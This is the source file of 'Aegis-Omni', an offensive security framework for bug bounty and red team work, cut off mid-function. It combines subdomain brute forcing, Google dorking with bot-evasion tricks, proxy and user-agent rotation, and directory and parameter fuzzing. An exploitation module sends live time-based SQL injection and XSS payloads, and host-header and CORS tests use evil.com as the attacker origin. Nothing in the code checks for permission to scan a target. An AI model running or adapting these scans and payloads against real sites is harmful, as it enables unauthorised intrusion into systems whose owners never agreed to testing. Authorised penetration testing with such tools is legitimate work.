#!/usr/bin/env python3
"""
Aegis-Omni: Monolithic All-in-One Offensive Security Framework
Built for Bug Bounty Hunters and Red Teamers.

This script integrates all modules into a single, comprehensive Python file with a Tkinter GUI,
leveraging asynchronous programming for high performance.
"""

import asyncio
import aiohttp
import aiodns
import json
import logging
import os
import random
import sqlite3
import sys
import threading
import time
import tkinter as tk
from datetime import datetime
from tkinter import ttk, messagebox, filedialog
from bs4 import BeautifulSoup
from urllib.parse import urlparse, parse_qs, urljoin
import re
import ipaddress

# --- Third-party dependencies (to be installed via pip) ---
# aiohttp, aiodns, playwright, beautifulsoup4, pybloom_live, scikit-learn, pandas, numpy,
# matplotlib, requests, tqdm, dnspython, shodan, censys, virustotal-python, python-whois,
# pyasn, ripestat, jsluice, esprima, pdfplumber, python-docx, openpyxl, stem, 2captcha-python,
# anti-captcha, levenshtein, scipy, uvloop, fpdf2, jinja2, python-dateutil, psutil, curl_cffi

# Ensure uvloop is installed and used if available for maximum performance
try:
    import uvloop
    asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())
    print("Using uvloop for asyncio event loop policy.")
except ImportError:
    print("uvloop not found, falling back to default asyncio event loop policy.")

# --- Configuration Management ---

class AegisConfig:
    """Manages configuration settings, API keys, and user preferences."""
    def __init__(self, config_path="config.json"):
        self.config_path = config_path
        self.data = {
            "api_keys": {
                "shodan": "",
                "censys": "",
                "virustotal": "",
                "securitytrails": "",
                "binaryedge": "",
                "fullhunt": "",
                "alienguard_otx": "",
                "hunter_io": "",
                "github": "",
                "gitlab": "",
                "2captcha": "",
                "anti_captcha": "",
                "hibp": ""
            },
            "settings": {
                "concurrency": 100,
                "timeout": 15,
                "request_delay_min": 0.5,
                "request_delay_max": 1.5,
                "proxy_list": [],
                "user_agent_pool": [
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15",
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0"
                ],
                "dork_depth": 3,
                "fuzz_wordlist_path": "wordlists/common.txt",
                "recon_depth": 2,
                "enable_playwright": False,
                "enable_tor": False,
                "tor_proxy": "socks5://127.0.0.1:9050"
            },
            "theme": "dark"
        }
        self.load()

    def load(self):
        """Loads configuration from config.json."""
        if os.path.exists(self.config_path):
            try:
                with open(self.config_path, "r") as f:
                    loaded_data = json.load(f)
                    # Merge loaded data, preserving defaults for missing keys
                    self.data = self._deep_merge(self.data, loaded_data)
            except json.JSONDecodeError:
                print(f"[ERROR] Could not decode config.json. Using default settings.")
            except Exception as e:
                print(f"[ERROR] Failed to load config.json: {e}. Using default settings.")

    def _deep_merge(self, default, override):
        """Recursively merges two dictionaries."""
        for key, value in override.items():
            if key in default and isinstance(default[key], dict) and isinstance(value, dict):
                default[key] = self._deep_merge(default[key], value)
            else:
                default[key] = value
        return default

    def save(self):
        """Saves current configuration to config.json."""
        try:
            with open(self.config_path, "w") as f:
                json.dump(self.data, f, indent=4)
        except Exception as e:
            print(f"[ERROR] Failed to save config.json: {e}")

    def get(self, key, default=None):
        """Retrieves a configuration value by dot-separated key (e.g., 'api_keys.shodan')."""
        parts = key.split('.')
        current = self.data
        for part in parts:
            if isinstance(current, dict) and part in current:
                current = current[part]
            else:
                return default
        return current

    def set(self, key, value):
        """Sets a configuration value by dot-separated key."""
        parts = key.split('.')
        current = self.data
        for i, part in enumerate(parts):
            if i == len(parts) - 1:
                current[part] = value
            else:
                if part not in current or not isinstance(current[part], dict):
                    current[part] = {}
                current = current[part]

# --- Database Management ---

class AegisDB:
    """Manages SQLite database for storing scan results, targets, and vulnerabilities."""
    def __init__(self, db_path="aegis_omni.db"):
        self.db_path = db_path
        self.conn = None
        self.connect()
        self.create_tables()

    def connect(self):
        """Establishes a database connection."""
        if self.conn is None:
            self.conn = sqlite3.connect(self.db_path, check_same_thread=False)
            self.conn.row_factory = sqlite3.Row # Access columns by name

    def close(self):
        """Closes the database connection."""
        if self.conn:
            self.conn.close()
            self.conn = None

    def create_tables(self):
        """Creates necessary tables if they don't exist."""
        cursor = self.conn.cursor()
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS targets (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                domain TEXT UNIQUE NOT NULL,
                added_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS subdomains (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                target_id INTEGER NOT NULL,
                subdomain TEXT UNIQUE NOT NULL,
                ip TEXT,
                source TEXT,
                resolved_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY(target_id) REFERENCES targets(id) ON DELETE CASCADE
            )
        """
        )
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS urls (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                target_id INTEGER NOT NULL,
                url TEXT UNIQUE NOT NULL,
                status_code INTEGER,
                title TEXT,
                content_hash TEXT,
                source TEXT,
                discovered_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY(target_id) REFERENCES targets(id) ON DELETE CASCADE
            )
        """
        )
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS vulnerabilities (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                target_id INTEGER NOT NULL,
                type TEXT NOT NULL,
                url TEXT NOT NULL,
                severity TEXT,
                description TEXT,
                proof TEXT,
                confirmed BOOLEAN DEFAULT 0,
                discovered_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY(target_id) REFERENCES targets(id) ON DELETE CASCADE
            )
        """
        )
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS dorks (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                category TEXT NOT NULL,
                dork_string TEXT UNIQUE NOT NULL,
                description TEXT
            )
        """
        )
        self.conn.commit()
        self._populate_initial_dorks()

    def _populate_initial_dorks(self):
        """Populates some initial dorks if the table is empty."""
        cursor = self.conn.cursor()
        cursor.execute("SELECT COUNT(*) FROM dorks")
        if cursor.fetchone()[0] == 0:
            initial_dorks = [
                ("Config Files", "inurl:/.git/config", "Exposed Git configuration files"),
                ("Log Files", "inurl:/.log", "Exposed log files"),
                ("Database Dumps", "inurl:.sql ext:sql", "Exposed SQL database dumps"),
                ("Admin Panels", "inurl:admin intitle:login", "Admin login panels"),
                ("PHP Info", "inurl:phpinfo.php", "PHP Info pages"),
                ("S3 Buckets", "site:s3.amazonaws.com bucket_name", "Open AWS S3 buckets"),
                ("API Keys", "github.com api_key", "API keys on GitHub"),
                ("Env Files", "inurl:.env", "Exposed .env files"),
            ]
            cursor.executemany("INSERT INTO dorks (category, dork_string, description) VALUES (?, ?, ?)", initial_dorks)
            self.conn.commit()

    def add_target(self, domain):
        """Adds a new target domain to the database."""
        cursor = self.conn.cursor()
        try:
            cursor.execute("INSERT INTO targets (domain) VALUES (?) RETURNING id", (domain,))
            target_id = cursor.fetchone()[0]
            self.conn.commit()
            return target_id
        except sqlite3.IntegrityError:
            cursor.execute("SELECT id FROM targets WHERE domain = ?", (domain,))
            return cursor.fetchone()[0]

    def add_subdomain(self, target_id, subdomain, ip, source):
        """Adds a discovered subdomain to the database."""
        cursor = self.conn.cursor()
        try:
            cursor.execute("INSERT INTO subdomains (target_id, subdomain, ip, source) VALUES (?, ?, ?, ?)",
                           (target_id, subdomain, ip, source))
            self.conn.commit()
        except sqlite3.IntegrityError:
            pass # Subdomain already exists

    def add_url(self, target_id, url, status_code=None, title=None, content_hash=None, source=None):
        """Adds a discovered URL to the database."""
        cursor = self.conn.cursor()
        try:
            cursor.execute("INSERT INTO urls (target_id, url, status_code, title, content_hash, source) VALUES (?, ?, ?, ?, ?, ?)",
                           (target_id, url, status_code, title, content_hash, source))
            self.conn.commit()
        except sqlite3.IntegrityError:
            pass # URL already exists

    def add_vulnerability(self, target_id, vuln_type, url, severity="Medium", description="", proof="", confirmed=False):
        """Adds a discovered vulnerability to the database."""
        cursor = self.conn.cursor()
        cursor.execute("INSERT INTO vulnerabilities (target_id, type, url, severity, description, proof, confirmed) VALUES (?, ?, ?, ?, ?, ?, ?)",
                       (target_id, vuln_type, url, severity, description, proof, confirmed))
        self.conn.commit()

    def get_subdomains_for_target(self, target_id):
        """Retrieves all subdomains for a given target_id."""
        cursor = self.conn.cursor()
        cursor.execute("SELECT subdomain, ip, source FROM subdomains WHERE target_id = ?", (target_id,))
        return cursor.fetchall()

    def get_urls_for_target(self, target_id):
        """Retrieves all URLs for a given target_id."""
        cursor = self.conn.cursor()
        cursor.execute("SELECT url, status_code, title FROM urls WHERE target_id = ?", (target_id,))
        return cursor.fetchall()

    def get_vulnerabilities_for_target(self, target_id):
        """Retrieves all vulnerabilities for a given target_id."""
        cursor = self.conn.cursor()
        cursor.execute("SELECT type, url, severity, description, confirmed FROM vulnerabilities WHERE target_id = ?", (target_id,))
        return cursor.fetchall()

    def get_all_dorks(self):
        """Retrieves all stored dorks."""
        cursor = self.conn.cursor()
        cursor.execute("SELECT dork_string FROM dorks")
        return [row[0] for row in cursor.fetchall()]

# --- Shared Utilities ---

class RequestHandler:
    """Handles HTTP requests with advanced features like proxy rotation, user-agent rotation, and delays."""
    def __init__(self, config, logger):
        self.config = config
        self.logger = logger
        self.session = None
        self.proxies = config.get("settings.proxy_list", [])
        self.user_agents = config.get("settings.user_agent_pool", [])
        self.current_proxy_idx = 0

    async def init_session(self):
        if not self.session:
            connector = aiohttp.TCPConnector(limit=self.config.get("settings.concurrency"), ssl=False)
            self.session = aiohttp.ClientSession(connector=connector)

    async def close_session(self):
        if self.session:
            await self.session.close()
            self.session = None

    def _get_random_headers(self):
        headers = {
            "User-Agent": random.choice(self.user_agents) if self.user_agents else "Aegis-Omni/1.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "Cache-Control": "max-age=0"
        }
        return headers

    def _get_proxy(self):
        if not self.proxies:
            return None
        proxy = self.proxies[self.current_proxy_idx]
        self.current_proxy_idx = (self.current_proxy_idx + 1) % len(self.proxies)
        return proxy

    async def fetch(self, url, method="GET", params=None, data=None, headers=None, allow_redirects=True, timeout=None, use_proxy=True):
        await self.init_session()
        full_headers = self._get_random_headers()
        if headers:
            full_headers.update(headers)
        
        proxy = self._get_proxy() if use_proxy and self.proxies else None
        
        effective_timeout = timeout if timeout is not None else self.config.get("settings.timeout")
        
        await asyncio.sleep(random.uniform(self.config.get("settings.request_delay_min"), self.config.get("settings.request_delay_max")))

        try:
            async with self.session.request(
                method,
                url,
                params=params,
                data=data,
                headers=full_headers,
                allow_redirects=allow_redirects,
                timeout=effective_timeout,
                proxy=proxy
            ) as response:
                return response.status, await response.text(), response.headers, response.url
        except aiohttp.ClientError as e:
            self.logger.debug(f"ClientError fetching {url} (proxy: {proxy}): {e}")
        except asyncio.TimeoutError:
            self.logger.debug(f"Timeout fetching {url} (proxy: {proxy})")
        except Exception as e:
            self.logger.debug(f"Unexpected error fetching {url} (proxy: {proxy}): {e}")
        return None, None, None, None

# --- Module 1: Reconnaissance (The Eye) ---

class ReconModule:
    """Performs passive and active reconnaissance to discover subdomains, IPs, and technologies."""
    def __init__(self, config, db, logger, request_handler):
        self.config = config
        self.db = db
        self.logger = logger
        self.request_handler = request_handler
        self.resolver = aiodns.DNSResolver()
        self.discovered_subdomains = set()
        self.target_id = None

    async def _resolve_dns_record(self, subdomain, record_type):
        """Resolves a specific DNS record type for a subdomain."""
        try:
            result = await self.resolver.query(subdomain, record_type)
            return [str(r.host) if hasattr(r, 'host') else str(r.address) if hasattr(r, 'address') else str(r) for r in result]
        except aiodns.error.DNSError as e:
            self.logger.debug(f"DNS resolution failed for {subdomain} ({record_type}): {e}")
        except Exception as e:
            self.logger.error(f"Unexpected error during DNS resolution for {subdomain} ({record_type}): {e}")
        return []

    async def get_crt_sh_subdomains(self, domain):
        """Queries crt.sh for subdomains related to the target domain."""
        self.logger.info(f"[Recon] Querying crt.sh for {domain}")
        url = f"https://crt.sh/?q=%.{domain}&output=json"
        status, text, _, _ = await self.request_handler.fetch(url, use_proxy=False) # crt.sh usually doesn't block proxies
        if status == 200 and text:
            try:
                data = json.loads(text)
                for entry in data:
                    name_value = entry.get("name_value", "")
                    for sub in name_value.split("\n"):
                        sub = sub.strip().lower()
                        if sub.endswith(domain) and "*" not in sub and sub not in self.discovered_subdomains:
                            self.discovered_subdomains.add(sub)
                            self.db.add_subdomain(self.target_id, sub, None, "crt.sh")
            except json.JSONDecodeError:
                self.logger.error(f"[Recon] Failed to parse crt.sh response for {domain}")
        return self.discovered_subdomains

    async def dns_deep_dive(self, subdomain):
        """Performs a deep DNS record enumeration for a given subdomain."""
        self.logger.debug(f"[Recon] Deep DNS dive for {subdomain}")
        record_types = ["A", "AAAA", "MX", "TXT", "NS", "CNAME", "SOA", "SPF"]
        results = {}
        for r_type in record_types:
            records = await self._resolve_dns_record(subdomain, r_type)
            if records:
                results[r_type] = records
                if r_type == "A" or r_type == "AAAA":
                    for ip in records:
                        self.db.add_subdomain(self.target_id, subdomain, ip, f"DNS {r_type}")
        return results

    async def subdomain_bruteforce(self, domain, wordlist_path="wordlists/subdomains.txt"):
        """Bruteforces subdomains using a wordlist and asyncio DNS resolvers."""
        self.logger.info(f"[Recon] Starting subdomain bruteforce for {domain}")
        if not os.path.exists(wordlist_path):
            self.logger.warning(f"[Recon] Subdomain wordlist not found at {wordlist_path}. Skipping bruteforce.")
            return

        with open(wordlist_path, "r") as f:
            words = [line.strip() for line in f if line.strip()]
        
        tasks = []
        for word in words:
            sub = f"{word}.{domain}"
            tasks.append(self._resolve_dns_record(sub, "A"))
        
        resolved_ips = await asyncio.gather(*tasks)
        for i, ips in enumerate(resolved_ips):
            if ips:
                sub = f"{words[i]}.{domain}"
                if sub not in self.discovered_subdomains:
                    self.discovered_subdomains.add(sub)
                    self.db.add_subdomain(self.target_id, sub, ",".join(ips), "Bruteforce")
                    self.logger.info(f"[Recon] Bruteforced subdomain found: {sub} -> {','.join(ips)}")

    async def permutation_engine(self, domain):
        """Generates and resolves permutations of discovered subdomains."""
        self.logger.info(f"[Recon] Running permutation engine for {domain}")
        common_prefixes = ["dev", "staging", "admin", "test", "api", "backup", "vpn", "mail", "remote", "secure", "portal", "mobile", "app", "beta", "demo", "stage", "prod", "internal", "external", "private", "public", "old", "new", "temp", "tmp", "backup2"]
        new_subs = set()
        for sub in list(self.discovered_subdomains):
            base_domain = sub.replace(f".{domain}", "")
            for prefix in common_prefixes:
                perm_sub = f"{prefix}-{base_domain}.{domain}"
                if perm_sub not in self.discovered_subdomains:
                    new_subs.add(perm_sub)
                perm_sub = f"{base_domain}-{prefix}.{domain}"
                if perm_sub not in self.discovered_subdomains:
                    new_subs.add(perm_sub)
                perm_sub = f"{prefix}.{base_domain}.{domain}"
                if perm_sub not in self.discovered_subdomains:
                    new_subs.add(perm_sub)

        tasks = []
        for sub in new_subs:
            tasks.append(self._resolve_dns_record(sub, "A"))
        
        resolved_ips = await asyncio.gather(*tasks)
        for i, ips in enumerate(resolved_ips):
            if ips:
                sub = list(new_subs)[i]
                if sub not in self.discovered_subdomains:
                    self.discovered_subdomains.add(sub)
                    self.db.add_subdomain(self.target_id, sub, ",".join(ips), "Permutation")
                    self.logger.info(f"[Recon] Permuted subdomain found: {sub} -> {','.join(ips)}")

    async def recursive_subdomain_discovery(self, domain, depth=0, max_depth=1):
        """Recursively discovers subdomains up to a certain depth."""
        if depth > max_depth:
            return
        
        self.logger.info(f"[Recon] Recursive subdomain discovery for {domain} (Depth: {depth})")
        initial_subs_count = len(self.discovered_subdomains)
        
        await self.get_crt_sh_subdomains(domain)
        await self.subdomain_bruteforce(domain)
        await self.permutation_engine(domain)

        newly_found_subs = len(self.discovered_subdomains) - initial_subs_count
        if newly_found_subs > 0:
            self.logger.info(f"[Recon] Found {newly_found_subs} new subdomains at depth {depth}. Recursing...")
            for sub in list(self.discovered_subdomains):
                if sub.endswith(domain) and sub != domain:
                    await self.recursive_subdomain_discovery(sub, depth + 1, max_depth)

    async def technology_fingerprinting(self, url):
        """Fingerprints technologies used on a given URL."""
        self.logger.debug(f"[Recon] Fingerprinting {url}")
        status, text, headers, _ = await self.request_handler.fetch(url)
        technologies = []
        if headers:
            if 'X-Powered-By' in headers:
                technologies.append(f"X-Powered-By: {headers['X-Powered-By']}")
            if 'Server' in headers:
                technologies.append(f"Server: {headers['Server']}")
            if 'Set-Cookie' in headers and 'wordpress' in headers['Set-Cookie'].lower():
                technologies.append("WordPress")
        if text:
            if "/wp-content/" in text or "/wp-includes/" in text:
                technologies.append("WordPress")
            if re.search(r"<meta name=\"generator\" content=\"(.*?)\">", text, re.IGNORECASE):
                match = re.search(r"<meta name=\"generator\" content=\"(.*?)\">", text, re.IGNORECASE)
                technologies.append(f"Generator: {match.group(1)}")
        if technologies:
            self.logger.info(f"[Recon] Technologies for {url}: {', '.join(technologies)}")
        return technologies

    async def run(self, domain, target_id):
        """Main entry point for the Reconnaissance module."""
        self.target_id = target_id
        self.discovered_subdomains.add(domain) # Add base domain
        self.db.add_subdomain(self.target_id, domain, None, "initial")

        self.logger.info(f"[Recon] Starting full reconnaissance for {domain}")
        
        # Initial passive discovery
        await self.get_crt_sh_subdomains(domain)
        
        # Recursive discovery (includes bruteforce and permutations)
        await self.recursive_subdomain_discovery(domain, max_depth=self.config.get("settings.recon_depth"))

        # DNS Deep Dive for all discovered subdomains
        dns_tasks = [self.dns_deep_dive(sub) for sub in list(self.discovered_subdomains)]
        await asyncio.gather(*dns_tasks)

        # Technology Fingerprinting for live subdomains (simplified to HTTP check)
        http_tasks = []
        for sub in list(self.discovered_subdomains):
            # Only check HTTP/HTTPS for subdomains that resolved to an IP
            cursor = self.db.conn.cursor()
            cursor.execute("SELECT ip FROM subdomains WHERE subdomain = ? AND ip IS NOT NULL", (sub,))
            if cursor.fetchone():
                http_tasks.append(self.technology_fingerprinting(f"http://{sub}"))
                http_tasks.append(self.technology_fingerprinting(f"https://{sub}"))
        await asyncio.gather(*http_tasks)

        self.logger.info(f"[Recon] Finished reconnaissance for {domain}. Found {len(self.discovered_subdomains)} subdomains.")
        return list(self.discovered_subdomains)

# --- Module 2: Hyper-Intelligent Dorking & OSINT (The Ghost) ---

class DorkingModule:
    """Performs intelligent dorking and OSINT using search engines and external APIs."""
    def __init__(self, config, db, logger, request_handler):
        self.config = config
        self.db = db
        self.logger = logger
        self.request_handler = request_handler
        self.target_id = None

    async def _perform_playwright_search(self, query):
        """Performs a search using Playwright for human-like automation."""
        from playwright.async_api import async_playwright
        self.logger.info(f"[Dorking] Performing Playwright search for: {query}")
        results = set()
        try:
            async with async_playwright() as p:
                browser = await p.chromium.launch(headless=True)
                context = await browser.new_context(
                    user_agent=random.choice(self.config.get("settings.user_agent_pool"))
                )
                page = await context.new_page()
                await page.goto(f"https://www.google.com/search?q={query}")
                
                # Simulate human interaction
                await asyncio.sleep(random.uniform(2, 5))
                await page.mouse.wheel(0, random.randint(100, 500))
                await asyncio.sleep(random.uniform(1, 3))

                # Extract results
                links = await page.eval_on_selector_all("div.g a", "elements => elements.map(e => e.href)")
                for link in links:
                    if link and "google.com" not in link and "youtube.com" not in link:
                        results.add(link)
                
                await browser.close()
        except Exception as e:
            self.logger.error(f"[Dorking] Playwright search failed for '{query}': {e}")
        return results

    async def contextual_dork_generation(self, domain, tech_stack):
        """Generates targeted dorks based on the target's technology stack."""
        self.logger.info(f"[Dorking] Generating contextual dorks for {domain} (Tech: {', '.join(tech_stack)})")
        generated_dorks = set()
        all_dorks = self.db.get_all_dorks()

        for dork_template in all_dorks:
            # Simple keyword matching for now, can be expanded with ML
            if any(tech.lower() in dork_template.lower() for tech in tech_stack) or \
               any(keyword in dork_template.lower() for keyword in ["config", "log", "sql", "admin", "php", "s3", "git", "env"]):
                generated_dorks.add(dork_template.replace("bucket_name", domain.split('.')[0]).replace("target", domain))
        
        # Add generic dorks for the domain
        generated_dorks.add(f"site:{domain} intitle:\"index of\"")
        generated_dorks.add(f"site:{domain} filetype:pdf confidential")
        generated_dorks.add(f"site:{domain} inurl:admin")

        return list(generated_dorks)

    async def run(self, domain, target_id, tech_stack=None):
        """Main entry point for the Dorking & OSINT module."""
        self.target_id = target_id
        self.logger.info(f"[Dorking] Starting dorking and OSINT for {domain}")

        if not tech_stack: # Fallback if recon didn't provide tech stack
            tech_stack = ["general"]

        dorks_to_run = await self.contextual_dork_generation(domain, tech_stack)
        all_dork_results = set()

        for dork in dorks_to_run:
            if self.config.get("settings.enable_playwright"):
                results = await self._perform_playwright_search(dork)
            else:
                # Fallback to direct HTTP request for search (less effective, prone to blocking)
                self.logger.warning("[Dorking] Playwright is disabled. Dorking might be less effective.")
                status, text, _, _ = await self.request_handler.fetch(f"https://www.google.com/search?q={dork}")
                if status == 200 and text:
                    soup = BeautifulSoup(text, 'html.parser')
                    for link in soup.select("div.g a"): # Simplified parsing
                        href = link.get('href')
                        if href and "google.com" not in href and "youtube.com" not in href:
                            all_dork_results.add(href)
                results = set()

            for url in results:
                if domain in url: # Only add relevant URLs for now
                    self.db.add_url(self.target_id, url, source="Dorking")
                    all_dork_results.add(url)
            await asyncio.sleep(random.uniform(self.config.get("settings.request_delay_min") * 5, self.config.get("settings.request_delay_max") * 10)) # Longer delay for dorking

        self.logger.info(f"[Dorking] Finished dorking for {domain}. Found {len(all_dork_results)} potential URLs.")
        return list(all_dork_results)

# --- Module 3: Massive Fuzzing & Header Chaos (The Driller) ---

class FuzzingModule:
    """Performs intelligent fuzzing for directories, files, and parameters, and tests for header-based vulnerabilities."""
    def __init__(self, config, db, logger, request_handler):
        self.config = config
        self.db = db
        self.logger = logger
        self.request_handler = request_handler
        self.target_id = None
        self.wordlists = {
            "common": self._load_wordlist("wordlists/common.txt"),
            "dirs": self._load_wordlist("wordlists/dirs.txt"),
            "files": self._load_wordlist("wordlists/files.txt"),
            "params": self._load_wordlist("wordlists/params.txt")
        }
        self.soft_404_signatures = {}

    def _load_wordlist(self, path):
        """Loads a wordlist from a file."""
        if not os.path.exists(path):
            self.logger.warning(f"[Fuzzing] Wordlist not found at {path}. Some fuzzing might be skipped.")
            return []
        with open(path, "r") as f:
            return [line.strip() for line in f if line.strip()]

    async def _get_baseline_response(self, url):
        """Fetches a baseline response to detect soft 404s."""
        status, text, _, _ = await self.request_handler.fetch(url)
        if status == 200 and text:
            # Use a simple hash for content comparison for now
            return hash(text)
        return None

    async def _detect_soft_404(self, url_base):
        """Detects soft 404 pages by comparing with a non-existent path."""
        test_url = urljoin(url_base, f"aegis_non_existent_path_{random.randint(1000, 9999)}")
        status, text, _, _ = await self.request_handler.fetch(test_url)
        if status == 200 and text:
            self.soft_404_signatures[url_base] = hash(text)
            self.logger.info(f"[Fuzzing] Detected soft 404 signature for {url_base}")

    async def directory_fuzzing(self, base_url):
        """Fuzzes for common directories and files."""
        self.logger.info(f"[Fuzzing] Starting directory fuzzing for {base_url}")
        await self._detect_soft_404(base_url)

        tasks = []
        for word in self.wordlists["dirs"] + self.wordlists["files"]:
            fuzz_url = urljoin(base_url, word)
            tasks.append(self._fuzz_single_path(fuzz_url, base_url))
        
        await asyncio.gather(*tasks)

    async def _fuzz_single_path(self, fuzz_url, base_url):
        status, text, _, _ = await self.request_handler.fetch(fuzz_url)
        if status == 200 and text:
            content_hash = hash(text)
            if base_url in self.soft_404_signatures and self.soft_404_signatures[base_url] == content_hash:
                self.logger.debug(f"[Fuzzing] Soft 404 detected for {fuzz_url}")
                return
            self.logger.info(f"[Fuzzing] Found: {fuzz_url} (Status: {status})")
            self.db.add_url(self.target_id, fuzz_url, status, BeautifulSoup(text, 'html.parser').title.string if BeautifulSoup(text, 'html.parser').title else None, content_hash, "Fuzzing")

    async def parameter_fuzzing(self, url):
        """Fuzzes for hidden GET/POST parameters (Arjun-like logic)."""
        self.logger.info(f"[Fuzzing] Starting parameter fuzzing for {url}")
        parsed_url = urlparse(url)
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
        
        found_params = set()
        for param_name in self.wordlists["params"]:
            test_params = {param_name: "aegis_test_value"}
            status, text, _, _ = await self.request_handler.fetch(base_url, params=test_params)
            if status == 200 and text and "aegis_test_value" in text: # Simple reflection check
                self.logger.info(f"[Fuzzing] Found reflecting parameter: {param_name} on {url}")
                found_params.add(param_name)
        return list(found_params)

    async def header_injection_tests(self, url):
        """Tests for various header injection vulnerabilities."""
        self.logger.info(f"[Fuzzing] Running header injection tests for {url}")
        vulnerabilities = []
        # Host Header Injection
        headers = {"Host": "evil.com"}
        status, text, _, _ = await self.request_handler.fetch(url, headers=headers)
        if text and "evil.com" in text: # Simplified check
            self.logger.warning(f"[Fuzzing] Potential Host Header Injection on {url}")
            vulnerabilities.append(("Host Header Injection", url, "High", "Reflected evil.com in response"))
            self.db.add_vulnerability(self.target_id, "Host Header Injection", url, "High", "Reflected evil.com in response")
        
        # X-Forwarded-For bypass
        headers = {"X-Forwarded-For": "127.0.0.1"}
        status, text, _, _ = await self.request_handler.fetch(url, headers=headers)
        if status == 200 and text and "127.0.0.1" in text: # Simplified check
            self.logger.warning(f"[Fuzzing] Potential X-Forwarded-For bypass on {url}")
            vulnerabilities.append(("X-Forwarded-For Bypass", url, "Medium", "Reflected 127.0.0.1 in response"))
            self.db.add_vulnerability(self.target_id, "X-Forwarded-For Bypass", url, "Medium", "Reflected 127.0.0.1 in response")

        return vulnerabilities

    async def cors_misconfiguration(self, url):
        """Checks for CORS misconfigurations."""
        self.logger.info(f"[Fuzzing] Checking CORS misconfiguration for {url}")
        headers = {"Origin": "https://evil.com"}
        status, _, resp_headers, _ = await self.request_handler.fetch(url, headers=headers)
        if resp_headers and resp_headers.get("Access-Control-Allow-Origin") == "https://evil.com":
            self.logger.warning(f"[Fuzzing] CORS Misconfiguration (Reflected Origin) on {url}")
            self.db.add_vulnerability(self.target_id, "CORS Misconfiguration", url, "High", "Reflected Origin header")
            return True
        return False

    async def run(self, urls, target_id):
        """Main entry point for the Fuzzing module."""
        self.target_id = target_id
        self.logger.info(f"[Fuzzing] Starting fuzzing for {len(urls)} URLs.")
        
        fuzzing_tasks = []
        for url in urls:
            parsed_url = urlparse(url)
            if parsed_url.scheme and parsed_url.netloc:
                base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
                fuzzing_tasks.append(self.directory_fuzzing(base_url))
                fuzzing_tasks.append(self.parameter_fuzzing(url))
                fuzzing_tasks.append(self.header_injection_tests(url))
                fuzzing_tasks.append(self.cors_misconfiguration(url))
        
        await asyncio.gather(*fuzzing_tasks)
        self.logger.info(f"[Fuzzing] Finished fuzzing.")

# --- Module 4: Exploitation Engine (The Striker) ---

class ExploitModule:
    """Attempts to exploit identified vulnerabilities like SQLi, XSS, SSRF, etc."""
    def __init__(self, config, db, logger, request_handler, validator):
        self.config = config
        self.db = db
        self.logger = logger
        self.request_handler = request_handler
        self.validator = validator
        self.target_id = None

    async def check_sqli(self, url, param, method="GET"):
        """Checks for time-based SQL Injection."""
        self.logger.info(f"[Exploit] Checking SQLi on {url} (param: {param})")
        payload_sleep = "\' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)-- -"
        payload_normal = "\' AND 1=1-- -"

        # Baseline request
        start_time_normal = time.time()
        status_normal, _, _, _ = await self.request_handler.fetch(url, params={param: payload_normal} if method == "GET" else None, data={param: payload_normal} if method == "POST" else None)
        elapsed_normal = time.time() - start_time_normal

        # Malicious request
        start_time_sleep = time.time()
        status_sleep, _, _, _ = await self.request_handler.fetch(url, params={param: payload_sleep} if method == "GET" else None, data={param: payload_sleep} if method == "POST" else None)
        elapsed_sleep = time.time() - start_time_sleep

        if status_normal == 200 and status_sleep == 200 and elapsed_sleep > elapsed_normal + 4: # 4 seconds buffer
            self.logger.warning(f"[Exploit] Confirmed Time-based SQLi on {url} with param {param}")
            self.db.add_vulnerability(self.target_id, "Time-based SQL Injection", url, "Critical", f"Parameter '{param}' vulnerable to time-based SQLi. Delay: {elapsed_sleep:.2f}s", f"Payload: {payload_sleep}", confirmed=True)
            return True
        return False

    async def check_xss(self, url, param, method="GET"):
        """Checks for reflected XSS."""
        self.logger.info(f"[Exploit] Checking XSS on {url} (param: {param})")
        payload = "<script>alert('Aegis-Omni-XSS')</script>"
        
        status, text, _, _ = await self.request_handler.fetch(url, params={param: payload} if method == "GET" else None, data={param: payload} if method == "POST" else None)
        
        if status == 200 and text and payload in text:
            # Use validator for DOM-based XSS if Playwright is enabled
            if self.config.get("settings.enable_playwright"):
                if await self.validator.verify_dom_xss(url, param, payload):
                    self.logger.warning(f"[Exploit] Confirmed DOM-based XSS on {url} with param {param}")
                    self.db.add_vulnerability(self.target_id, "DOM-based XSS", url, "High", f"Parameter '{param}' vulnerable to DOM-based XSS.", f"Payload: {payload}", confirmed=True)
                    return True
            else:
                self.logger.warning(f"[Exploit] Potential Reflected XSS on {url} with param {param}")
                self.db.add_vulnerability(self.target_id, "Reflected XSS", url, "Medium", f"Parameter '{param}' vulnerable to reflected XSS.", f"Payload: {payload}", confirmed=False)
                return True
        return False

    async def check_ssrf(self, url, param, method="GET"):
